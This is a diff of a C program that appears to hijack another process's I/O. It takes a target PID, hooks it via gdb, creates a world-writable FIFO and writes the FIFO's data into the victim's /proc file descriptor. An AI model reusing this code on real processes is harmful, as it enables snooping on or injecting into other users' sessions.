@@ -77,30 +77,35 @@ int main(int argc, char const *argv[]) {
   //SETUP
   pid = (char *)argv[1];
   char *fifo_name_list[1]; //peut etre une upgrade dans le futur
-  fifo_name_list[0] = random_choise((int)1);
+  fifo_name_list[0] = random_choise((int)(1));
   mkfifo(fifo_name_list[0], 0);
   chmod(fifo_name_list[0], 0666);
 
-  fd_backup = gdb_hook((char *)argv[1], fifo_name_list[0]);
+  fd_backup = gdb_hook((char *)argv[1], fifo_name_list);
   char path[120]={0};
   char buff[512];
   size_t len = 0;
 
-  sprintf(path, "/proc/%s/fd/4", argv[1]);
+  sprintf(path, "/proc/%s/fd/%d", argv[1], fd_backup);
   FILE *victime = fopen(path,"w+");
   int tube = open(fifo_name_list[0],066);
-  //fprintf(stderr,"fd open %d path:%s\n", tube, fifo_name_list[0]);
+
+
   if(victime==NULL){
     fprintf(stderr,"%s\n", strerror(errno));
     return 2;
   }
 
+
   fcntl(tube, F_SETFL, fcntl(tube,F_GETFL, 0) | O_NONBLOCK);
   while (flag) {
     memset(buff,0, 512);
+    //stdout
     len = read(tube, buff, 512);
     write(STDOUT_FILENO, buff, len);
     write(fileno(victime), buff, len);
+    usleep(200);
+
   }
   //CLEANUP
   fclose(victime);
